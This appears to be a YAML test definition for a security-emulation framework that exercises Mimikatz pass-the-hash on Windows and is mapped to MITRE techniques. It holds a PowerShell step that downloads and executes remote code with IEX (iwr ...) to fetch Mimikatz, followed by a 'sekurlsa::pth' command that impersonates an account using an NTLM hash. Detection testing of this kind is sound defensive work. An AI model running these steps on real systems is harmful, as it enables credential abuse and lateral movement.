api_version: "2.0"
name: Mimikatz Pass the Hash
description: |
    Note: must dump hashes first
    [Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)
args:
    - name: user_name
      type: string
      default: Administrator
    - name: ntlm
      type: string
      default: cc36cf7a8514893efccd3324464tkg1a
    - name: domain
      type: string
      default: '%userdnsdomain%'
    - name: mimikatz_path
      type: path
      default: '%tmp%\mimikatz\x64\mimikatz.exe'
uuid: ec23cef9-27d9-46e4-a68d-6f75f7b86908
mitre:
    tactics:
        - 'TA0005: Defense Evasion'
        - 'TA0008: Lateral Movement'
    techniques:
        - 'T1550: Use Alternate Authentication Material'
    subtechniques:
        - 'T1550.002: Pass the Hash'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})
      inline: "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {{[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n}}\n"
      executor: powershell
    - name: mimikatz-pass-the-hash
      inline: |
        {{.Args.mimikatz_path}} "sekurlsa::pth /user:{{.Args.user_name}} /domain:{{.Args.domain}} /ntlm:{{.Args.ntlm}}"
      executor: command_prompt
      cleanup:
        inline: ""
        executor: command_prompt
